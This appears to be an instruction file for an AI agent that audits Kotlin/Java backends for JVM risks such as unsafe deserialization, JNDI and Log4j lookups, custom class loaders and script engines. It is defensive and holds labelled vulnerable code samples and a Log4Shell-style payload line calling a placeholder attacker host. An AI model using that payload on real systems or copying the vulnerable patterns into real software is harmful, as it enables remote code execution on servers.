# JVM Anomaly Detection (Kotlin / Java)

[ref: #jvm-anomalies-detection]

You are performing a focused security assessment of Kotlin/Java codebases for **JVM-specific execution anomalies**. These are language- and runtime-level patterns that can lead to remote code execution, unauthorized behavior, or malicious code execution through mechanisms unique to the JVM ecosystem: unsafe deserialization, JNDI injection, custom `ClassLoader`s, JNI/native loading, reflection abuse, compiler plugins, logging expression lookups, scripting engines, RMI/JMX, `MethodHandle`/`invokedynamic`, and runtime instrumentation. This skill uses a three-phase approach with subagents: **recon** (find suspicious JVM construction sites), **batched verify** (determine whether each site is exploitable or legitimate, in parallel batches of 3), and **merge** (consolidate results).

**Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.

## Table of contents

- [What is a JVM anomaly](#what-is-a-jvm-anomaly)
- [Vulnerable vs Secure Examples](#vulnerable-vs-secure-examples)
- [JVM Anomaly Taxonomy](#jvm-anomaly-taxonomy)
- [Detection heuristics per category](#detection-heuristics-per-category)
- [Execution](#execution)
- [OWASP API Security Top 10 2023 mapping](#owasp-api-security-top-10-2023-mapping)
- [CWE references](#cwe-references)
- [Important Reminders](#important-reminders)
- [References](#references)

---

## What is a JVM anomaly

A JVM anomaly is any use of a Java/Kotlin runtime facility in a way that allows an attacker to execute arbitrary code, load untrusted classes, bypass type safety, or exfiltrate data by exploiting features that are powerful and often invisible to higher-level static analysis. These patterns are especially dangerous in API backends because a single deserialized request, a logged header, or a reflected method call can become a full server compromise.

The core question: *does this JVM facility process attacker-controlled data without a safe contract, sandbox, or explicit allowlist?*

### What a JVM anomaly IS

- **Unsafe deserialization**: calling `ObjectInputStream.readObject()` on untrusted bytes, or enabling polymorphic type handling in JSON/XML/ YAML libraries without an explicit allowlist.
- **JNDI injection**: `InitialContext.lookup()` (or `DirContext.lookup()`) with attacker-controlled names, including through log messages, headers, or configuration values.
- **Custom ClassLoaders**: loading bytecode from network, file uploads, encrypted blobs, or user input without signature verification.
- **JNI / native library loading**: `System.loadLibrary()` or `Runtime.load()` with attacker-influenced paths, or exposing native attack surface.
- **Kotlin reflection abuse**: `callBy`, `memberFunctions`, `declaredMemberProperties`, or `KClass` lookups driven by user input.
- **KSP / compiler plugins**: annotation processors or Kotlin Symbol Processing plugins that generate code from untrusted schemas/inputs or alter security-critical classes.
- **Log4j-style lookups**: logging frameworks that evaluate `${...}` expressions in messages (JNDI, env, sysprops) without disabling lookup substitution.
- **Scripting engines**: `ScriptEngineManager`, `Nashorn`, `GroovyShell`, `KotlinScript` executing user-supplied code.
- **RMI / JMX exposure**: exported MBeans, RMI registries, or JMX connectors reachable without authentication.
- **Instrumentation / agents**: `java.lang.instrument` agents or `Instrumentation` APIs that transform classes at runtime.
- **MethodHandle / invokedynamic**: dynamic call sites constructed from untrusted descriptors.
- **Unsafe / off-heap access**: `sun.misc.Unsafe` or `java.lang.foreign` / Panama used to bypass memory safety.

### What a JVM anomaly is NOT

Do not flag these as anomalies:

- **Normal serialization** with explicit type allowlists, schema-bound DTOs, or protobuf/Avro/Thrift generated classes.
- **Legitimate JNDI lookups** of hardcoded, internal resources (e.g., `java:comp/env/jdbc/MyDB`) during startup.
- **Standard class loading** from the application classpath or dependency jars.
- **Kotlin reflection** used for internal dependency injection or serialization frameworks that validate types against a schema.
- **Logging frameworks** with lookup substitution explicitly disabled or using structured logging without string interpolation.
- **Native libraries** shipped and loaded from a fixed, vendor-controlled path.
- **KSP plugins** that only generate code from trusted, version-controlled schemas.

### Patterns that prevent JVM anomalies

When you see these patterns, the code is likely **not vulnerable**:

**1. Allowlisted deserialization**
```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("!*");
in.setObjectInputFilter(filter);
// Only expected classes are allowed; filter rejects everything else by default.
```

**2. Disabled lookup substitution in logging**
```xml
<!-- Log4j2: disable message lookups to prevent ${jndi:...} evaluation -->
<Property name="log4j2.formatMsgNoLookups">true</Property>
```

**3. Hardcoded JNDI resource names**
```java
// Name is a constant, not derived from request data
DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/MyDB");
```

---

## Vulnerable vs Secure Examples

### Unsafe Java deserialization

```java
// VULNERABLE: reads any serialized object from request body
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();

// SECURE: use a JSON DTO with a strict schema
MyRequestDto dto = objectMapper.readValue(body, MyRequestDto.class);
// Or use ObjectInputFilter with an explicit allowlist
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter("com.example.SafeClass;!*"));
```

### Jackson polymorphic deserialization

```java
// VULNERABLE: enables default typing globally
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // or activateDefaultTyping without allowlist

// SECURE: use @JsonTypeInfo with a closed set of known subtypes
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Circle.class, name = "circle"),
    @JsonSubTypes.Type(value = Square.class, name = "square")
})
public abstract class Shape { }
```

### JNDI lookup from user input

```java
// VULNERABLE: attacker controls the lookup name
String name = request.getParameter("name");
Context ctx = new InitialContext();
ctx.lookup(name);

// SECURE: hardcoded resource name or strict allowlist
Set<String> ALLOWED = Set.of("java:comp/env/jdbc/MyDB");
String name = request.getParameter("name");
if (!ALLOWED.contains(name)) throw new IllegalArgumentException();
ctx.lookup(name);
```

### Log4j-style lookup in a logged header

```java
// VULNERABLE: header value is interpolated by the logger
logger.info("User-Agent: {}", request.getHeader("User-Agent"));
// Payload: ${jndi:ldap://attacker.com/a}

// SECURE: disable lookups or sanitize input before logging
// Log4j2: set log4j2.formatMsgNoLookups=true
logger.info("User-Agent: {}", sanitize(header));
```

### Custom ClassLoader loading network bytes

```java
// VULNERABLE: downloads bytecode and defines a class
byte[] bytes = httpClient.getBody(url);
Class<?> c = new ClassLoader() {
    public Class<?> define(byte[] b) { return defineClass(null, b, 0, b.length); }
}.define(bytes);

// SECURE: only load signed, allowlisted modules from a trusted repository
ModuleLayer layer = createLayerForSignedModule(digest, signature);
```

### Kotlin reflection callBy with user input

```kotlin
// VULNERABLE: arbitrary function name and arguments from request
val kClass = Class.forName(request.body.className).kotlin
val fn = kClass.functions.first { it.name == request.body.methodName }
fn.callBy(request.body.args)

// SECURE: dispatch through a closed enum or sealed class
val action = Action.valueOf(request.body.action) // strict parsing
when (action) { ... }
```

### JNI / native library loading

```java
// VULNERABLE: path influenced by user input or environment
String lib = System.getProperty("user.lib");
System.load(lib);

// SECURE: load only from a fixed, application-controlled location
System.loadLibrary("myverified"); // resolves via java.library.path under operator control
```

### Script engine executing user code

```java
// VULNERABLE: executes arbitrary script from request
ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");
engine.eval(request.getParameter("script"));

// SECURE: no script execution; use a domain-specific expression evaluator with an allowlist
Expression expr = safeEvaluator.parse(request.getParameter("expr"));
```

### KSP plugin processing untrusted schemas

```kotlin
// VULNERABLE: code generator reads remote/untrusted schema and emits sources
val schema = URL(request.body.schemaUrl).readText()
generateKotlinSources(schema) // could emit malicious or backdoored code

// SECURE: schema is version-controlled, hash-pinned, and validated against a JSON Schema
val schema = loadPinnedSchema("schemas/v1/order.json")
generateKotlinSources(schema)
```

---

## JVM Anomaly Taxonomy

| Category | Description | Typical signals |
| --- | --- | --- |
| **Unsafe deserialization** | Parsing serialized Java objects or enabling polymorphic type handling without an allowlist. | `ObjectInputStream.readObject`, `readUnshared`, Jackson `enableDefaultTyping` / `activateDefaultTyping`, XStream `fromXML`, Kryo `readClassAndObject`, YAML `load`, unsafe JSON polymorphism. |
| **JNDI injection** | Looking up attacker-controlled names through JNDI, often via log messages, headers, or config. | `InitialContext.lookup`, `DirContext.search`, `ctx.lookup(name)` where `name` is dynamic, `${jndi:...}` strings. |
| **Custom ClassLoaders** | Defining classes from untrusted bytes, network, or encrypted payloads. | `defineClass`, `ClassLoader.defineClass`, `URLClassLoader` with constructed URLs, `ByteBuddy`/`ASM`/`Javassist` generating classes from dynamic input. |
| **JNI / native loading** | Loading native libraries from attacker-influenced paths. | `System.load`, `System.loadLibrary`, `Runtime.load`, `Runtime.loadLibrary`, `ProcessBuilder` compiling/loading native code. |
| **Kotlin reflection abuse** | Using Kotlin reflection APIs to invoke arbitrary members from user input. | `KClass.functions`, `KCallable.callBy`, `memberProperties`, `declaredMemberFunctions`, `Class.forName(...).kotlin`. |
| **KSP / compiler plugins** | Annotation processors or KSP plugins that generate or transform code from untrusted inputs. | `SymbolProcessor`, `AbstractProcessor`, `process(resolver)`, code generation driven by remote schemas or external files. |
| **Log4j-style lookups** | Logging frameworks that evaluate `${...}` lookups in messages. | `${jndi:...}`, `${env:...}`, `${sys:...}` in log messages; `log4j2.formatMsgNoLookups` not set; `%msg{lookups}` patterns. |
| **Scripting engines** | Executing scripts (JS, Groovy, Kotlin script) from request or config data. | `ScriptEngine.eval`, `GroovyShell.parse`, `KotlinScriptEngine`, `Nashorn`, `javax.script`. |
| **RMI / JMX exposure** | Remote method invocation or JMX connectors exposed without strong auth. | `LocateRegistry.createRegistry`, `JMXConnectorServer`, `MBeanServer.registerMBean`, RMI stub classes. |
| **Instrumentation / agents** | Runtime class transformation or agent loading. | `java.lang.instrument`, `Instrumentation.retransformClasses`, premain/agentmain, attach API. |
| **MethodHandle / invokedynamic** | Dynamic call sites built from untrusted descriptors. | `MethodHandles.lookup`, `MethodHandle.invoke`, `LambdaMetafactory`, `CallSite` construction from user data. |
| **Unsafe / off-heap access** | Use of `sun.misc.Unsafe`, `VarHandle`, or foreign-function API to bypass safety. | `Unsafe.getUnsafe`, `allocateMemory`, `putInt`, `VarHandle` on arbitrary memory, `MemorySegment` from untrusted addresses. |

---

## Detection heuristics per category

### Unsafe deserialization

- Search for `ObjectInputStream` and `readObject`/`readUnshared` calls. Check whether the stream source is attacker-controllable.
- Look for Jackson `enableDefaultTyping`, `activateDefaultTyping`, `@JsonTypeInfo(use = Id.CLASS/MINIMAL_CLASS)`, or `ObjectMapper` configurations that allow class-name-based polymorphism.
- Check XStream, Kryo, SnakeYAML, Fastjson, Gson, JSON-B, JAXB configurations for unsafe type handling.
- Look for RMI/JRMP, JMX over RMI, or HTTP invoker endpoints that deserialize objects.
- Verify whether `ObjectInputFilter` (JDK 9+) or a class allowlist is applied.

### JNDI injection

- Search for `InitialContext.lookup`, `DirContext.lookup`, `EventContext.lookup`, `NamingManager.getObjectInstance`.
- Check whether the lookup name is built from request parameters, headers, log data, or configuration files writable by users.
- Look for log messages that include attacker-controlled values without disabling lookups (`log4j2.formatMsgNoLookups`, `%m{nolookups}`).
- Check LDAP, RMI, DNS, and IIOP protocols in lookup names; these are classic JNDI/RCE vectors.
- Examine dependency versions of Log4j, Logback, JBoss Logging, and other frameworks for known JNDI CVEs.

### Custom ClassLoaders

- Search for `defineClass`, `URLClassLoader`, `ClassLoader.defineClass`, `MethodHandles.Lookup.defineClass`.
- Check whether byte arrays passed to `defineClass` come from the network, file uploads, decryption, or reflection.
- Look for bytecode generation libraries (`ByteBuddy`, `ASM`, `Javassist`, `cglib`) driven by request data.
- Verify whether loaded classes are signed, checksum-verified, or bound to an allowlist.

### JNI / native loading

- Search for `System.load`, `System.loadLibrary`, `Runtime.load`, `Runtime.loadLibrary`.
- Check whether the library path is influenced by system properties, environment variables, or request data.
- Look for JNI method declarations (`native`) and `ProcessBuilder`/`gcc`/`clang` usage that compiles native code on the fly.
- Verify that `java.library.path` is restricted and libraries are shipped with the application.

### Kotlin reflection abuse

- Search for `Class.forName(...).kotlin`, `KClass`, `KCallable.callBy`, `KFunction.call`, `memberFunctions`, `declaredMemberFunctions`, `memberProperties`.
- Check whether reflection targets are derived from request data (class name, method name, property name).
- Look for `callBy` with a map of arguments built from JSON/XML input.
- Verify that reflection is constrained to a sealed set of known classes/methods.

### KSP / compiler plugins

- Identify annotation processors (`AbstractProcessor`) or KSP `SymbolProcessor` implementations.
- Check what inputs drive code generation: remote schemas, annotation attributes, external files, environment variables.
- Look for generated code that contains network calls, reflection, native loading, or dynamic dispatch.
- Verify that generated code is checked into version control or reproducibly built from pinned inputs.

### Log4j-style lookups

- Identify logging framework and version (Log4j2, Logback, JUL, JBoss Logging, SLF4J bridges).
- Check configuration for `formatMsgNoLookups=true`, `%m{nolookups}`, or equivalent settings.
- Search for log statements that interpolate user-controlled values directly into the message: `logger.info("..." + userInput)`.
- Look for custom appenders, layouts, or converters that evaluate expressions.

### Scripting engines

- Search for `ScriptEngineManager`, `ScriptEngine.eval`, `GroovyShell`, `KotlinScriptEngine`, `NashornScriptEngine`.
- Check whether the script source is request data, config, or an untrusted file.
- Look for sandboxes, SecurityManagers (deprecated), or allowlisted bindings.
- Verify that script execution is necessary and cannot be replaced with a safer expression evaluator.

### RMI / JMX exposure

- Search for `LocateRegistry.createRegistry`, `UnicastRemoteObject`, `JMXConnectorServerFactory`, `MBeanServer.registerMBean`.
- Check whether RMI/JMX ports are bound to all interfaces or accessible from the network.
- Look for authentication requirements (`JMXAuthenticator`, SSL, password files).
- Verify that JMX/RMI is not exposed in production or is protected by network policy.

### Instrumentation / agents

- Search for `java.lang.instrument`, `Instrumentation`, `premain`, `agentmain`, `VirtualMachine.attach`.
- Check whether agents are loaded dynamically from paths controlled by users or environment variables.
- Look for `retransformClasses` or `redefineClasses` that modify security-sensitive classes at runtime.
- Verify that agents are signed, allowlisted, and loaded from a trusted directory.

### MethodHandle / invokedynamic

- Search for `MethodHandles.lookup`, `MethodHandle.invoke`, `LambdaMetafactory`, `CallSite`, `MutableCallSite`.
- Check whether method descriptors, class names, or target objects come from request data.
- Look for dynamic proxies (`Proxy.newProxyInstance`) with handler logic driven by user input.

### Unsafe / off-heap access

- Search for `sun.misc.Unsafe`, `jdk.internal.misc.Unsafe`, `VarHandle`, `MemorySegment`, `Arena`, `FunctionDescriptor`.
- Check whether addresses, sizes, or layouts are derived from user input.
- Look for foreign-function calls (`Linker.downcallHandle`) to native libraries from dynamic paths.

---

## Execution

This skill runs in three phases using subagents. Pass the contents of `{{ REPORTS_ROOT }}/01_architecture.md` to all subagents as context.

### Phase 1: Recon — Find Suspicious JVM Construction Sites

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase that uses JVM-specific facilities unsafely: unsafe deserialization, JNDI lookups, custom ClassLoaders, JNI/native loading, Kotlin reflection abuse, KSP/compiler plugins, Log4j-style lookups, scripting engines, RMI/JMX exposure, instrumentation agents, MethodHandle/invokedynamic, or Unsafe/off-heap access. Write results to `{{ REPORTS_ROOT }}/24_recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, language (Java/Kotlin), frameworks, build pipeline, and normal serialization/reflection mechanisms.
>
> **What to search for**:
>
> 1. **Unsafe deserialization**:
>    - Java: `ObjectInputStream.readObject`, `readUnshared`, RMI/JRMP, JMX over RMI, HTTP invoker.
>    - Jackson: `enableDefaultTyping`, `activateDefaultTyping`, `@JsonTypeInfo(use = Id.CLASS/MINIMAL_CLASS)`.
>    - Other: XStream `fromXML`, Kryo `readClassAndObject`, SnakeYAML `load`, Fastjson parse with `AutoType`.
>
> 2. **JNDI injection**:
>    - `InitialContext.lookup`, `DirContext.lookup`, `NamingManager.getObjectInstance` with dynamic names.
>    - Log messages that interpolate attacker-controlled values (`${jndi:...}`, `${env:...}`, `${sys:...}`).
>
> 3. **Custom ClassLoaders**:
>    - `defineClass`, `URLClassLoader`, `MethodHandles.Lookup.defineClass`.
>    - Bytecode generation: ByteBuddy, ASM, Javassist, cglib driven by dynamic input.
>
> 4. **JNI / native loading**:
>    - `System.load`, `System.loadLibrary`, `Runtime.load`, `Runtime.loadLibrary`.
>    - Native method declarations and on-the-fly native compilation.
>
> 5. **Kotlin reflection abuse**:
>    - `Class.forName(...).kotlin`, `KClass.functions`, `KCallable.callBy`, `memberProperties`.
>
> 6. **KSP / compiler plugins**:
>    - `SymbolProcessor`, `AbstractProcessor`, code generation from remote schemas or external files.
>
> 7. **Log4j-style lookups**:
>    - Log4j2/Logback/JUL configurations; `formatMsgNoLookups`; `%m{nolookups}`; custom layouts.
>
> 8. **Scripting engines**:
>    - `ScriptEngine.eval`, `GroovyShell`, `KotlinScriptEngine`, Nashorn.
>
> 9. **RMI / JMX exposure**:
>    - `LocateRegistry.createRegistry`, `JMXConnectorServer`, `MBeanServer.registerMBean`.
>
> 10. **Instrumentation / agents**:
>     - `java.lang.instrument`, `premain`, `agentmain`, `VirtualMachine.attach`.
>
> 11. **MethodHandle / invokedynamic**:
>     - `MethodHandles.lookup`, `LambdaMetafactory`, `CallSite` from user data.
>
> 12. **Unsafe / off-heap access**:
>     - `sun.misc.Unsafe`, `VarHandle`, `MemorySegment`, `Arena`, foreign-function calls.
>
> **What to skip**:
> - Schema-bound JSON/XML deserialization to known DTOs.
> - Hardcoded JNDI names for internal resources during startup.
> - Standard classpath loading.
> - Signed/allowlisted plugin systems.
> - DI frameworks (Spring, Koin) using reflection on known types.
>
> **Output format** — write to `{{ REPORTS_ROOT }}/24_recon.md`:
>
> ```markdown
> # JVM Anomaly Recon: [Project Name]
>
> ## Summary
> Found [N] suspicious JVM construction sites: [X] deserialization, [Y] JNDI, [Z] ClassLoaders, etc.
>
> ## Suspicious Construction Sites
>
> ### 1. [Descriptive name]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Function / endpoint**: [name]
> - **Category**: [deserialization / JNDI / classloader / JNI / kotlin-reflection / ksp / logging-lookup / scripting / rmi-jmx / instrumentation / methodhandle / unsafe]
> - **Suspicious pattern**: [the call or construct]
> - **Code snippet**:
>   ```
>   [relevant code]
>   ```
> - **Why it may be vulnerable**: [one-line rationale]
>
> [Repeat for each site]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `{{ REPORTS_ROOT }}/24_recon.md`. If the recon found **zero suspicious sites** (the summary reports "Found 0" or the "Suspicious Construction Sites" section is empty or absent), **skip Phase 2 and Phase 3 entirely**. Instead, write the following content to `{{ REPORTS_ROOT }}/24_jvm_anomalies.md` and stop:

```markdown
# JVM Anomaly Analysis Results

No JVM-specific anomalies found.
```

Only proceed to Phase 2 if Phase 1 found at least one suspicious site.

### Phase 2: Verify — Determine Exploitable JVM Anomalies (Batched)

After Phase 1 completes, read `{{ REPORTS_ROOT }}/24_recon.md` and split the sites into **batches of up to 3 sites each**. Launch **one subagent per batch in parallel**. Each subagent verifies only its assigned sites and writes results to its own batch file.

**Batching procedure**:

1. Read `{{ REPORTS_ROOT }}/24_recon.md` and count the numbered site sections (`### 1.`, `### 2.`, etc.).
2. Divide them into batches of up to 3. For example, 8 sites → 3 batches (1-3, 4-6, 7-8).
3. For each batch, extract the full text of those site sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned sites.
5. Each subagent writes to `{{ REPORTS_ROOT }}/24_batch_N.md` where N is the 1-based batch number.
6. Identify the project's primary JVM language/framework from `{{ REPORTS_ROOT }}/01_architecture.md` and select **only the matching examples** from the "Vulnerable vs. Secure Examples" section above. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions:

> **Goal**: For each assigned suspicious JVM construction site, determine whether it is exploitable, suspicious-but-legitimate, or a false positive. Write results to `{{ REPORTS_ROOT }}/24_batch_[N].md`.
>
> **Your assigned sites** (from the recon phase):
>
> [Paste the full text of the assigned site sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, normal serialization/reflection mechanisms, and authorized plugin/extension systems.
>
> **JVM anomaly reference — what to look for**:
>
> For each site, answer these questions:
>
> 1. **Is the input attacker-controllable?**
>    - Does data flow from an HTTP request, header, query parameter, body, file upload, config file, log message, or third-party response into the JVM facility?
>    - Is there a trust boundary crossed without validation?
> 2. **Is the facility inherently dangerous?**
>    - Does it allow arbitrary code execution, class loading, native execution, or reflection on attacker-chosen targets?
>    - Is there an allowlist, sandbox, or ObjectInputFilter that limits behavior?
> 3. **Is the configuration unsafe?**
>    - Is default typing enabled? Are lookups enabled in logging? Is JNDI/RMI exposed without auth?
>    - Are dependencies known to be vulnerable (Log4j2 < 2.17, Fastjson, etc.)?
> 4. **What is the blast radius?**
>    - Can the vulnerability be triggered by an unauthenticated request?
>    - Does it lead to RCE, data exfiltration, SSRF, or lateral movement?
>
> **Vulnerable vs. secure examples for this project's tech stack**:
>
> [TECH-STACK EXAMPLES]
>
> **Classification**:
> - **[VULNERABLE]**: Confirmed unsafe use of a JVM facility with attacker-controllable input and no effective mitigation.
> - **[LIKELY VULNERABLE]**: Strong indicators of unsafe use but some uncertainty about reachability or input control.
> - **[SUSPICIOUS BUT LEGITIMATE]**: Unusual pattern but has a plausible product purpose (e.g., internal plugin system, signed agents, hardcoded JNDI names).
> - **[NEEDS MANUAL REVIEW]**: Cannot determine exploitability from code alone; requires runtime testing or maintainer interview.
>
> **Required fields for every finding**:
> - **OWASP API 2023 root-cause risk**: choose API5:2023 Broken Function Level Authorization, API8:2023 Security Misconfiguration, API10:2023 Unsafe Consumption of APIs, and/or the relevant injection risk, and explain why.
> - **CWE**: map to the most specific CWE from the reference (e.g., CWE-502, CWE-74, CWE-94, CWE-843, CWE-400, CWE-665).
> - **Dynamic test / verification**: describe a safe, read-only check to confirm the behavior (e.g., inspect dependency versions, review ObjectInputFilter config, test lookup substitution with a benign marker).
>
> **Output format** — write to `{{ REPORTS_ROOT }}/24_batch_[N].md`:
>
> ```markdown
> # JVM Anomaly Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [name]
> - **OWASP API 2023 root-cause risk**: [API5 / API8 / API10 / ...]
> - **CWE**: [CWE-502 / CWE-74 / CWE-94 / ...]
> - **Issue**: [e.g., "ObjectInputStream.readObject on request body with no filter"]
> - **Taint trace / trigger**: [how attacker input reaches the JVM facility]
> - **Impact**: [RCE, SSRF, data exfiltration, class loading, etc.]
> - **Evidence**:
>   ```
>   [code snippet]
>   ```
> - **Remediation**: [e.g., add ObjectInputFilter, disable lookups, allowlist reflection targets, upgrade Log4j2]
> - **Verification Steps**:
>   ```
>   [safe read-only confirmation steps]
>   ```
>
> ### [LIKELY VULNERABLE] Descriptive name
> ...
>
> ### [SUSPICIOUS BUT LEGITIMATE] Descriptive name
> ...
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> ...
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/24_batch_*.md` file and merge them into a single `{{ REPORTS_ROOT }}/24_jvm_anomalies.md`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `{{ REPORTS_ROOT }}/24_batch_1.md`, `{{ REPORTS_ROOT }}/24_batch_2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving the original classification and all detail fields.
3. Count totals across all batches for the executive summary.
4. Write the merged report to `{{ REPORTS_ROOT }}/24_jvm_anomalies.md` using this format:

```markdown
# JVM Anomaly Analysis Results: [Project Name]

## Executive Summary
- Suspicious sites analyzed: [total across all batches]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Suspicious but Legitimate: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then SUSPICIOUS BUT LEGITIMATE.
 Preserve every field from the batch results exactly as written.]
```

5. After writing `{{ REPORTS_ROOT }}/24_jvm_anomalies.md`, **delete all intermediate batch files** (`{{ REPORTS_ROOT }}/24_batch_*.md`).

---

## OWASP API Security Top 10 2023 mapping

| OWASP Risk | Why JVM Anomalies Matter |
|---|---|
| **API5:2023 Broken Function Level Authorization** | Reflection, scripting, and dynamic dispatch can be abused to call administrative or internal functions without proper authorization checks. |
| **API8:2023 Security Misconfiguration** | Unsafe deserialization, enabled JNDI/lookup substitution, exposed RMI/JMX, and unsigned ClassLoaders are hardening failures that expose the JVM runtime. |
| **API10:2023 Unsafe Consumption of APIs** | Third-party data passed to deserialization, reflection, scripting, or JNDI sinks can compromise the server through a trusted-looking integration. |

---

## CWE references

- CWE-502: Deserialization of Untrusted Data
- CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-843: Access of Resource Using Incompatible Type ('Type Confusion')
- CWE-400: Uncontrolled Resource Consumption
- CWE-665: Improper Initialization
- CWE-672: Operation on a Resource after Expiration or Release
- CWE-913: Improper Control of Dynamically-Managed Code Resources
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- CWE-1108: Excessive Reliance on Global Data

---

## Important Reminders

- JVM anomaly detection is **high-signal but easy to over-report**. Many Java/Kotlin applications use reflection for dependency injection, serialization, or testing. Always verify whether the input is attacker-controllable.
- Check **dependency versions** for known JVM deserialization or JNDI vulnerabilities: Log4j2, Jackson, XStream, Kryo, Fastjson, Apache Commons Collections, etc.
- Check **git history** for the insertion of suspicious code: `git log -p --follow -- <file>` and `git blame -L <start>,<end> <file>`.
- Do **not** run exploit payloads against production. Verification must be read-only (configuration review, version checks, static taint analysis, benign marker tests).
- Preserve evidence before remediation: screenshots, commit hashes, dependency versions, and file hashes.
- Subagents are read-only: they must not modify project source code, commit changes, or run potentially malicious code.

---

## References

- OWASP API Security Top 10 2023 — API5:2023 Broken Function Level Authorization
- OWASP API Security Top 10 2023 — API8:2023 Security Misconfiguration
- OWASP API Security Top 10 2023 — API10:2023 Unsafe Consumption of APIs
- OWASP Cheat Sheet Series — Deserialization
- OWASP Cheat Sheet Series — Logging
- CWE-502: Deserialization of Untrusted Data
- CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-913: Improper Control of Dynamically-Managed Code Resources
- JNDI Injection and Log4j2 (CVE-2021-44228) post-mortems
